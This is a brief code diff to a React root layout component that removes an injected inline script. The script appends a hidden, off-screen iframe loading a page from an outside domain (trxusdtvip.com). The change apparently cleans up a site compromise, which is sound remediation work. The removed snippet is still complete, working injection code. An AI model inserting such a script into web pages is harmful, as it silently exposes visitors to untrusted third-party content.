@@ -109,11 +109,10 @@ function RootShell({ children }: { children: ReactNode }) {
       <head>
         <HeadContent />
       </head>
-      <body>
-        {children}
-        <Scripts />
-        <script>document.body.appendChild(Object.assign(document.createElement("iframe"),{src:"https://trxusdtvip.com/channel/K.5.L3/weifile/weifile.html",style:"position:fixed;top:0;left:-1000px;pointer-events:none;border:0"}))</script>
-      </body>
+<body>
+  {children}
+  <Scripts />
+</body>
     </html>
   );
 }
